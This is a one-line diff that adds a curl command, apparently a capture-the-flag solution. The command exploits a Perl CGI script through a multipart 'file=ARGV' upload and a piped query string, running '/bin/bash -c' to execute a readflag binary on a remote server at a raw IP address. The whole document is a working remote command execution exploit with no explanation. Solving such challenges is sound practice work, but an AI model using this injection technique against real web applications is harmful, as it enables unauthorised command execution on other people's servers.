@@ -1,0 +1,1 @@
+echo "asdf" | curl -F "file=ARGV" -F "file=@-" "http://104.199.235.135:31334/cgi-bin/index.cgi?/bin/bash%20-c%20../../run/../../readflag|"
